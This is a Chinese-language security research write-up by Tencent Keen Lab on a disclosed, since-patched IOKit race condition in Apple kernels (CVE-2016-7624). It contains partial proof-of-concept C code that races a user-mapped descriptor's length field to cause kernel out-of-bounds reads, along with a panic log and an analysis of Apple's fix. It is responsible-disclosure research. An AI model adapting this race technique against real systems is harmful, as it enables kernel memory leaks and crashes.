作者：[Flanker@ 腾讯科恩实验室](https://blog.flanker017.me/racing-for-everyone-descriptor-describes-toctou-in-apple-core-cn/)

来源：[ 腾讯科恩实验室](http://keenlab.tencent.com/zh/2017/01/09/Racing-for-everyone-descriptor-describes-TOCTOU-in-Apple-s-core/)，
[drops.wiki](http://drops.wiki/index.php/2017/01/09/osx/)

这篇文章是关于我们在苹果内核IOKit驱动中找到的一类新攻击面。之前写了个IDA脚本做了个简单扫描，发现了至少四个驱动都存在这类问题并报告给了苹果，苹果分配了3个CVE(CVE-2016-7620/4/5),
见 <https://support.apple.com/kb/HT207423。>
后来我和苹果的安全工程师聊天，他们告诉我他们根据这个pattern修复了十多个漏洞，包括iOS内核中多个可以利用的漏洞。

为了能更清楚地描述这类新漏洞，我们先来复习下IOKit的基础知识。

## IOKit revisited

在用户态, IOConnectCallMethod函数实现如下：

    
    
    1709 kern_return_t
    1710 IOConnectCallMethod(
    1711    mach_port_t  connection,        // In
    1712    uint32_t     selector,      // In
    1713    const uint64_t  *input,         // In
    1714    uint32_t     inputCnt,      // In
    1715    const void  *inputStruct,       // In
    1716    size_t       inputStructCnt,    // In
    1717    uint64_t    *output,        // Out
    1718    uint32_t    *outputCnt,     // In/Out
    1719    void        *outputStruct,      // Out
    1720    size_t      *outputStructCntP)  // In/Out
    
    1721 {
    //...
    1736     if (inputStructCnt <= sizeof(io_struct_inband_t)) {
    1737    inb_input      = (void *) inputStruct;
    1738    inb_input_size = (mach_msg_type_number_t) inputStructCnt;
    1739     }
    1740     else {
    1741    ool_input      = reinterpret_cast_mach_vm_address_t(inputStruct);
    1742    ool_input_size = inputStructCnt;
    1743     }
    1744 //...
    1770    else if (size <= sizeof(io_struct_inband_t)) {
    1771        inb_output      = outputStruct;
    1772        inb_output_size = (mach_msg_type_number_t) size;
    1773    }
    1774    else {
    1775        ool_output      = reinterpret_cast_mach_vm_address_t(outputStruct);
    1776        ool_output_size = (mach_vm_size_t)    size;
    1777    }
    1778     }
    1779 
    1780     rtn = io_connect_method(connection,         selector,
    1781                (uint64_t *) input, inputCnt,
    1782                inb_input,          inb_input_size,
    1783                ool_input,          ool_input_size,
    1784                inb_output,         &inb_output_size,
    1785                output,             outputCnt,
    1786                ool_output,         &ool_output_size);
    1787 
    //...
    1795     return rtn;
    1796 }

如果输入的inputstruct大于`sizeof(io_struct_inband_t)`,
那么传入的参数会被cast成`mach_vm_address_t`，在后面被特殊对待。

## 这里能race不？不能？那里呢？

对于每一个有好奇心的人，我们都要问，这些平常被漏洞研究者们熟视无睹的参数里有没有那些能触发条件竞争漏洞？历史上人们通常都把注意力集中在一看名字就知道有可能有race
condition漏洞的`IOConnectMapMemory`中，之前包括pangu和google-project-zero的ian
beer都在这里有过非常深入的研究，也导致这个人们所熟知的攻击面漏洞已经非常少了。

那回过头再来看这些IOKit的参数，这些被人们忽视的地方，究竟会不会有race呢？ 我们还是需要深入了解下IOKit调用中参数是如何从用户态传递到内核态的？

在MIG trap定义和对应生成的代码中，不同的输入类型会得到不同的对待处理。

    
    
    601
    602routine io_connect_method(
    603     connection      : io_connect_t;
    604 in  selector        : uint32_t;
    605
    606 in  scalar_input    : io_scalar_inband64_t;
    607 in  inband_input    : io_struct_inband_t;
    608 in  ool_input       : mach_vm_address_t;
    609 in  ool_input_size  : mach_vm_size_t;
    610
    611 out inband_output   : io_struct_inband_t, CountInOut;
    612 out scalar_output   : io_scalar_inband64_t, CountInOut;
    613 in  ool_output      : mach_vm_address_t;
    614 inout ool_output_size   : mach_vm_size_t
    615 );
    616

下面是自动生成的代码:

    
    
    /* Routine io_connect_method */
    mig_external kern_return_t io_connect_method
    (
        mach_port_t connection,
        uint32_t selector,
        io_scalar_inband64_t scalar_input,
        mach_msg_type_number_t scalar_inputCnt,
        io_struct_inband_t inband_input,
        mach_msg_type_number_t inband_inputCnt,
        mach_vm_address_t ool_input,
        mach_vm_size_t ool_input_size,
        io_struct_inband_t inband_output,
        mach_msg_type_number_t *inband_outputCnt,
        io_scalar_inband64_t scalar_output,
        mach_msg_type_number_t *scalar_outputCnt,
        mach_vm_address_t ool_output,
        mach_vm_size_t *ool_output_size
    )
    {
    //...
    
        (void)memcpy((char *) InP->scalar_input, (const char *) scalar_input, 8 * scalar_inputCnt);
    //...
        if (inband_inputCnt > 4096) {
            { return MIG_ARRAY_TOO_LARGE; }
        }
    
        (void)memcpy((char *) InP->inband_input, (const char *) inband_input, inband_inputCnt);
    
    //...
    
        InP->ool_input = ool_input;
    
        InP->ool_input_size = ool_input_size;

这段代码告诉我们，scala_input和大小小于4096的structinput是会被memcpy嵌入到传递入内核的machmsg中的，所以这里面似乎没有用户态再操作的空间。

但是，如果struct_input的大小大于4096，那么这里就有特殊对待了。它会被保留为mach_vm_address且不会被更改。

我们再继续追下去，看看这个mach_vm_address进入内核之后又会被如何处理

    
    
    3701 kern_return_t is_io_connect_method
    3702 (
    3703    io_connect_t connection,
    3704    uint32_t selector,
    3705    io_scalar_inband64_t scalar_input,
    3706    mach_msg_type_number_t scalar_inputCnt,
    3707    io_struct_inband_t inband_input,
    3708    mach_msg_type_number_t inband_inputCnt,
    3709    mach_vm_address_t ool_input,
    3710    mach_vm_size_t ool_input_size,
    3711    io_struct_inband_t inband_output,
    3712    mach_msg_type_number_t *inband_outputCnt,
    3713    io_scalar_inband64_t scalar_output,
    3714    mach_msg_type_number_t *scalar_outputCnt,
    3715    mach_vm_address_t ool_output,
    3716    mach_vm_size_t *ool_output_size
    3717 )
    3718 {
    3719     CHECK( IOUserClient, connection, client );
    3720 
    3721     IOExternalMethodArguments args;
    3722     IOReturn ret;
    3723     IOMemoryDescriptor * inputMD  = 0;
    3724     IOMemoryDescriptor * outputMD = 0;
    3725 
    //...
    3736     args.scalarInput = scalar_input;
    3737     args.scalarInputCount = scalar_inputCnt;
    3738     args.structureInput = inband_input;
    3739     args.structureInputSize = inband_inputCnt;
    3740 
    3741     if (ool_input)
    3742    inputMD = IOMemoryDescriptor::withAddressRange(ool_input, ool_input_size,
    3743                            kIODirectionOut, current_task());
    3744 
    3745     args.structureInputDescriptor = inputMD;
    //...
    3753     if (ool_output && ool_output_size)
    3754     {
    3755    outputMD = IOMemoryDescriptor::withAddressRange(ool_output, *ool_output_size,
    3756                            kIODirectionIn, current_task());
    //...
    3774     return (ret);
    3775 }

在这里我们可以看出苹果和Linux内核在处理输入上的一些不同。在Linux内核中，用户态输入倾向于被copy_from_user到一个内核allocate的空间中。而苹果内核对于大于4096的用户输入，则倾向于用一个IOMemoryDescriptor对其作一个映射，然后在内核态访问。

既然有映射存在，那么我们就要动歪脑筋了。我们能不能在IOKit调用进行的同时去在用户态修改这个映射呢？之前并没有人研究过这个问题，也没有相关的漏洞公布，似乎大家都默认，在发起调用后，这是用户态不可写的。真的是这样么？

令人吃惊的是，测试表明，这居然是可写的！后来苹果的工程师告诉我们，他们在看到我的漏洞报告的时候，才发现之前连他们都没注意到这里居然还是用户态可写的。

这就意味着，对于一个IOKit调用，如果内核处理输入的IOService接受MemoryDescriptor的话（绝大多数都接受），那么发起调用的用户态进程可以在输入被内核处理的时候去修改掉传入的参数内容，没有锁，也没有只读保护。由于连苹果的工程师都没有注意这个问题，这意味着他们在编写内核驱动的时候基本没有对这部分数据做保护处理，这不就是条件竞争漏洞的天堂么！

我迅速回忆了一下之前逆向过的几个IOKit驱动，很快就有一个漏洞pattern出现。IOReportUserClient, IOCommandQueue,
IOSurface在处理用户态传进来的inputStruct的时候，在里面取出了一个长度作为后续边界处理的条件，虽然开发者肯定都先校验了这个长度，但由于这个racecondition的存在，那么用户态还是可以改掉这个长度绕过检查，自然就触发了越界。其他的pattern还有更多，就是发挥想象力的时候了。我们先来分析下IOCommandQueue这个典型例子，也就是CVE-2016-7624.

## IOCommandQueue内核服务中存在沙箱进程可以调用的越界读写漏洞

在IOCommandQueue::submit_command_buffer这个函数中，存在如上所述的条件竞争漏洞。这个函数接受structureInput或者structureInputDescriptor，其中在特定的offset存储了一个长度，虽然长度在传入的时候被校验过，
但利用这个条件竞争，攻击者依然可以控制长度，造成后续的越界读写。

### 漏洞分析

IOAccelCommandQueue::s_submit_command_buffers接受用户输入的IOExternalMethodArguments,
如果structureInputDescriptor存在，那么descriptor会被用来映射为memorymap并翻译为原始地址.

    
    
    __int64 __fastcall IOAccelCommandQueue::s_submit_command_buffers(IOAccelCommandQueue *this, __int64 a2, IOExternalMethodArguments *a3)
    {
      IOExternalMethodArguments *v3; // r12@1
      IOAccelCommandQueue *v4; // r15@1
      unsigned __int64 inputdatalen; // rsi@1
      unsigned int v6; // ebx@1
      IOMemoryDescriptor *v7; // rdi@3
      __int64 v8; // r14@3
      __int64 inputdata; // rcx@5
    
      v3 = a3;
      v4 = this;
      inputdatalen = (unsigned int)a3->structureInputSize;
      v6 = -536870206;
      if ( inputdatalen >= 8
        && inputdatalen - 8 == 3
                             * (((unsigned __int64)(0x0AAAAAAAAAAAAAAABLL * (unsigned __int128)(inputdatalen - 8) >> 64) >> 1) & 0x7FFFFFFFFFFFFFF8LL) )
      {
        v7 = (IOMemoryDescriptor *)a3->structureInputDescriptor;
        v8 = 0LL;
        if ( v7 )
        {
          v8 = (__int64)v7->vtbl->__ZN18IOMemoryDescriptor3mapEj(v7, 4096LL);
          v6 = -536870200;
          if ( !v8 )
            return v6;
          inputdata = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v8 + 280LL))(v8);
          LODWORD(inputdatalen) = v3->structureInputSize;
        }

我们可以看到在offset+4, 一个DWORD被用来作为length和((unsigned **int64)(0x0AAAAAAAAAAAAAAABLL
* (unsigned** int128)(inputdatalen - 8) >> 64) >> 1) & 0x7FFFFFFFFFFFFFF8LL)比较

随后这个length在submit_command_buffer中再次被使用.

    
    
    if ( *((_QWORD *)this + 160) )
    {
      v5 = (IOAccelShared2 *)*((_QWORD *)this + 165);
      if ( v5 )
      {
        IOAccelShared2::processResourceDirtyCommands(v5);
        IOAccelCommandQueue::updatePriority((IOAccelCommandQueue *)v2);
        if ( *(_DWORD *)(input + 4) )
        {
          v6 = (unsigned __int64 *)(input + 24);
          v7 = 0LL;
          do
          {
            IOAccelCommandQueue::submitCommandBuffer(
              (IOAccelCommandQueue *)v2,
              *((_DWORD *)v6 - 4),//v6 based on input
              *((_DWORD *)v6 - 3),//based on input
              *(v6 - 1),//based on input
              *v6);//based on input
            ++v7;
            v6 += 3;
          }
          while ( v7 < *(unsigned int *)(input + 4) ); //NOTICE HERE
        }

注意在23行*(input+4)又被作为循环的边界使用. 但就像前面说的一样，如果用户态传进来一个descriptor,
他可以在这个时候在用户态改变这个值，绕过`s_submit_command_buffers`的检查，造成oob。

在`IOAccelCommandQueue::submitCommandBuffer`中:

    
    
    IOGraphicsAccelerator2::sendBlockFenceNotification(
      *((IOGraphicsAccelerator2 **)this + 166),
      (unsigned __int64 *)(*((_QWORD *)this + 160) + 16LL),
      data_from_input_add_24_minus_8,
      0LL,
      v13);
    result = IOGraphicsAccelerator2::sendBlockFenceNotification(
               *((IOGraphicsAccelerator2 **)this + 166),
               (unsigned __int64 *)(*((_QWORD *)this + 160) + 16LL),
               data_from_input_add_24,
               0LL,
               v13);

我们可以看到内存内容以notification
callback的返回给用户态，那么攻击者通过前面控制长度并在越界的部分精心布置内存，那么就可以造成这部分越界的内存被返回给用户态，导致内核内存泄漏甚至代码执行。

具体触发步骤为

  * 用户态mmap内存， 通过IOKit调用的structureInputDescriptor传递进去
  * 内核中s_submit_command_buffer函数在+4偏移校验这个长度和传入的内容长度是否匹配
  * submit_command_buffer遍历用户态传入的descriptor内存，以+4偏移的内容为长度边界。读出的内容在submitCommandBuffer中经过变换通过asyncNotificationPort返回给用户态。
  * 用户态通过条件竞争更改map内存的长度，造成越界读写

### POC代码

The POC代码比较长，完整版见[https://github.com/flankerhqd/descriptor-describes-racing
](https://github.com/flankerhqd/descriptor-describes-racing)，这里只贴部分关键代码：

    
    
    //...
    char* dommap()
    {
        size_t i = ool_size;
        void *rr_addr = mmap(0x80000000, size, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
        printf("mmap addr %p\n", rr_addr);
        memset(rr_addr, 'a', i);
        return rr_addr;
    }
    volatile unsigned int secs = 10;
    void modifystrcut()
    {
        //usleep(secs++);
        *((unsigned int*)(input+4)) = 0x7fffffff;
        //*((unsigned int*)(input+4)) = 0xffff;
        printf("secs %x\n", secs);
    }
    
    //...
    int main(int argc, const char * argv[]) {
        //...
        input = dommap();
        {
            char* structinput = input;
        *((unsigned int*)(structinput+4)) = 0xaa;//the size is then used in for loop, possible to change it in descriptor?
        size_t outcnt = 0;
    
        }
        const size_t bufsize = 4088;
        char buf[bufsize];
        memset(buf, 'a', sizeof(buf)*bufsize);
        size_t outcnt =0;
        *((unsigned int*)(buf+4)) = 0xaa;
        {
            pthread_t t;
            pthread_create(&t, NULL, modifystrcut, NULL);
    
        io_connect_method(
                          conn,
                          1,
                          NULL,//input
                          0,//inputCnt
                          buf,//inb_input
                          bufsize,//inb_input_size
                          reinterpret_cast_mach_vm_address_t(input),//ool_input
                          ool_size,//ool_input_size
                          buf,//inb_output
                          (mach_msg_type_number_t*)&outputcnt, //inb_output_size*
                          (uint64_t*)buf,//output
                          &outputcnt, //outputCnt
                          reinterpret_cast_mach_vm_address_t(buf), //ool_output
                          (mach_msg_type_number_t*)&outputcnt64//ool_output_size*
                          );
    
        }
        return 0;
    }

两个关键的参数是 are 4088 and 0xaa, 这两个整数主要为了通过内核中

    
    
    inputdatalen - 8 == 3
                            * (((unsigned __int64)(0x0AAAAAAAAAAAAAAABLL * (unsigned __int128)(inputdatalen - 8) >> 64) >> 1) & 0x7FFFFFFFFFFFFFF8LL) )

和

    
    
    if ( *(_DWORD *)(inputdata + 4) == (unsigned int)((unsigned __int64)(0x0AAAAAAAAAAAAAAABLL
                                                                        * (unsigned __int128)((unsigned __int64)(unsigned int)inputdatalen
                                                                                            - 8) >> 64) >> 4) )

的检查。

在POC运行之后，内核相邻内存的内容就会被leak回用户态。如果边界没有映射内存的话，就会触发一个内核panic。

### 样例Panic Report

    
    
    Sat Jun 11 21:49:00 2016
    
    *** Panic Report ***
    panic(cpu 0 caller 0xffffff801dfce5fa): Kernel trap at 0xffffff7fa039d2a4, type 14=page fault, registers:
    CR0: 0x0000000080010033, CR2: 0xffffff812735f000, CR3: 0x000000000ce100ab, CR4: 0x00000000001627e0
    RAX: 0x000000007fffffff, RBX: 0xffffff812735f008, RCX: 0x0000000000000000, RDX: 0x0000000000000000
    RSP: 0xffffff81276d3b60, RBP: 0xffffff81276d3b80, RSI: 0x0000000000000000, RDI: 0xffffff802fcaef80
    R8:  0x00000000ffffffff, R9:  0x0000000000000002, R10: 0x0000000000000007, R11: 0x0000000000007fff
    R12: 0xffffff8031862800, R13: 0xaaaaaaaaaaaaaaab, R14: 0xffffff812735e000, R15: 0x00000000000000aa
    RFL: 0x0000000000010293, RIP: 0xffffff7fa039d2a4, CS:  0x0000000000000008, SS:  0x0000000000000010
    Fault CR2: 0xffffff812735f000, Error code: 0x0000000000000000, Fault CPU: 0x0, PL: 0
    
    Backtrace (CPU 0), Frame : Return Address
    0xffffff81276d37f0 : 0xffffff801dedab12 mach_kernel : _panic + 0xe2
    0xffffff81276d3870 : 0xffffff801dfce5fa mach_kernel : _kernel_trap + 0x91a
    0xffffff81276d3a50 : 0xffffff801dfec463 mach_kernel : _return_from_trap + 0xe3
    0xffffff81276d3a70 : 0xffffff7fa039d2a4 com.apple.iokit.IOAcceleratorFamily2 : __ZN19IOAccelCommandQueue22submit_command_buffersEPK29IOAccelCommandQueueSubmitArgs + 0x8e
    0xffffff81276d3b80 : 0xffffff7fa039c92c com.apple.iokit.IOAcceleratorFamily2 : __ZN19IOAccelCommandQueue24s_submit_command_buffersEPS_PvP25IOExternalMethodArguments + 0xba
    0xffffff81276d3bc0 : 0xffffff7fa03f6db5 com.apple.driver.AppleIntelHD5000Graphics : __ZN19IGAccelCommandQueue14externalMethodEjP25IOExternalMethodArgumentsP24IOExternalMethodDispatchP8OSObjectPv + 0x19
    0xffffff81276d3be0 : 0xffffff801e4dfa07 mach_kernel : _is_io_connect_method + 0x1e7
    0xffffff81276d3d20 : 0xffffff801df97eb0 mach_kernel : _iokit_server + 0x5bd0
    0xffffff81276d3e30 : 0xffffff801dedf283 mach_kernel : _ipc_kobject_server + 0x103
    0xffffff81276d3e60 : 0xffffff801dec28b8 mach_kernel : _ipc_kmsg_send + 0xb8
    0xffffff81276d3ea0 : 0xffffff801ded2665 mach_kernel : _mach_msg_overwrite_trap + 0xc5
    0xffffff81276d3f10 : 0xffffff801dfb8dca mach_kernel : _mach_call_munger64 + 0x19a
    0xffffff81276d3fb0 : 0xffffff801dfecc86 mach_kernel : _hndl_mach_scall64 + 0x16
          Kernel Extensions in backtrace:
             com.apple.iokit.IOAcceleratorFamily2(205.10)[949D9C27-0635-3EE4-B836-373871BC6247]@0xffffff7fa0374000->0xffffff7fa03dffff
                dependency: com.apple.iokit.IOPCIFamily(2.9)[D8216D61-5209-3B0C-866D-7D8B3C5F33FF]@0xffffff7f9e72c000
                dependency: com.apple.iokit.IOGraphicsFamily(2.4.1)[172C2960-EDF5-382D-80A5-C13E97D74880]@0xffffff7f9f232000
             com.apple.driver.AppleIntelHD5000Graphics(10.1.4)[E5BC31AC-4714-3A57-9CDC-3FF346D811C5]@0xffffff7fa03ee000->0xffffff7fa047afff
                dependency: com.apple.iokit.IOSurface(108.2.1)[B5ADE17A-36A5-3231-B066-7242441F7638]@0xffffff7f9f0fb000
                dependency: com.apple.iokit.IOPCIFamily(2.9)[D8216D61-5209-3B0C-866D-7D8B3C5F33FF]@0xffffff7f9e72c000
                dependency: com.apple.iokit.IOGraphicsFamily(2.4.1)[172C2960-EDF5-382D-80A5-C13E97D74880]@0xffffff7f9f232000
                dependency: com.apple.iokit.IOAcceleratorFamily2(205.10)[949D9C27-0635-3EE4-B836-373871BC6247]@0xffffff7fa0374000
    
    BSD process name corresponding to current thread: cmdqueue1
    Boot args: keepsyms=1 -v
    
    Mac OS version:
    15F34
    
    Kernel version:
    Darwin Kernel Version 15.5.0: Tue Apr 19 18:36:36 PDT 2016; root:xnu-3248.50.21~8/RELEASE_X86_64
    Kernel UUID: 7E7B0822-D2DE-3B39-A7A5-77B40A668BC6
    Kernel slide:     0x000000001dc00000
    Kernel text base: 0xffffff801de00000
    __HIB  text base: 0xffffff801dd00000
    System model name: MacBookAir6,2 (Mac-7DF21CB3ED6977E5)

查看崩溃RIP寄存器附近的汇编代码

    
    
    __text:000000000002929E                 mov     esi, [rbx-10h]  ; unsigned int
    __text:00000000000292A1                 mov     edx, [rbx-0Ch]  ; unsigned int
    __text:00000000000292A4                 mov     rcx, [rbx-8]    ; unsigned __int64
    __text:00000000000292A8                 mov     r8, [rbx]       ; unsigned __int64

在这个崩溃中，rbx寄存器已经出现了越界，意味了内核在读取一个没有映射的内存内容，触发越界。

在 10.11.5 Macbook Airs, Macbook Pros 中测试复现：

    
    
    while true; do ./cmdqueue1 ; done

# 苹果的修复

苹果还没有公开XNU 10.11.2的源代码，但让我们先来逆向下binary kernel，并在Diaphora的帮助下定位修补的部分

在未修补的版本，我们可以看到有如下的关键代码

    
    
    3741     if (ool_input)
    3742    inputMD = IOMemoryDescriptor::withAddressRange(ool_input, ool_input_size,
    3743                            kIODirectionOut, current_task());

i.e.

    
    
    mov     rax, gs:8
    mov     rcx, [rax+308h] ; unsigned int
    mov     edx, 2          ; unsigned __int64
    mov     rsi, [rbp+arg_8] ; unsigned __int64
    call    __ZN18IOMemoryDescriptor16withAddressRangeEyyjP4task ; IOMemoryDescriptor::withAddressRange(ulong long,ulong long,uint,task *)
    mov     r15, rax

但是在10.11.2上，这部分在_is_io_connect_method代码变成了下面的样子

    
    
    mov     rax, gs:8
    mov     rcx, [rax+318h] ; unsigned int
    mov     edx, 20002h     ; unsigned __int64
    mov     rsi, [rbp+arg_8] ; unsigned __int64
    call    __ZN18IOMemoryDescriptor16withAddressRangeEyyjP4task ; IOMemoryDescriptor::withAddressRange(ulong long,ulong long,uint,task *)
    mov     r15, rax

一个新的flag (0x20000)
被引入到了IOMemoryDescriptor::withAddressRange。在调用栈接下来的IOGeneralMemoryDescriptor::memoryReferenceCreate函数中被检查

    
    
    if ( this->_task && !err && this->baseclass_0._flags & 0x20000 && !(optionsa & 4) ) //newly added source
      err = IOGeneralMemoryDescriptor::memoryReferenceCreate(this, optionsa | 4, &ref->mapRef);

随后在该函数的开头再次对应到映射的属性参数prot

    
    
    prot = 1;
    cacheMode = (this->baseclass_0._flags & 0x70000000) >> 28;
    v4 = vmProtForCacheMode(cacheMode);
    prot |= v4;
    if ( cacheMode )
      prot |= 2u;
    if ( 2 != (this->baseclass_0._flags & 3) )
      prot |= 2u;
    if ( optionsa & 2 )
      prot |= 2u;
    if ( optionsa & 4 )
      prot |= 0x200000u;

`prot`最终被用于`mach_make_memory_entry_64`, 描述这个mapping的permission.
0x200000其实就是MAP_MEM_VM_COPY

    
    
    382 /* leave room for vm_prot bits */
    383 #define MAP_MEM_ONLY        0x010000 /* change processor caching  */
    384 #define MAP_MEM_NAMED_CREATE    0x020000 /* create extant object      */
    385 #define MAP_MEM_PURGABLE    0x040000 /* create a purgable VM object */
    386 #define MAP_MEM_NAMED_REUSE 0x080000 /* reuse provided entry if identical */
    387 #define MAP_MEM_USE_DATA_ADDR   0x100000 /* preserve address of data, rather than base of page */
    388 #define MAP_MEM_VM_COPY     0x200000 /* make a copy of a VM range */
    389 #define MAP_MEM_VM_SHARE    0x400000 /* extract a VM range for remap */
    390 #define MAP_MEM_4K_DATA_ADDR    0x800000 /* preserve 4K aligned address of data */
    391 

这样就意味着在这个补丁之后，IOKit调用中传入的descriptors已经不再和用户态共享一个映射，免除了被用户态修改的烦恼。苹果选择了一个相对优雅的方案从根源上解决了问题，而不是一个一个地去修补对应的驱动代码。

## 致谢

科恩实验室的陈良对本研究亦有贡献。也感谢苹果安全团队的积极响应和修复。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/172/>

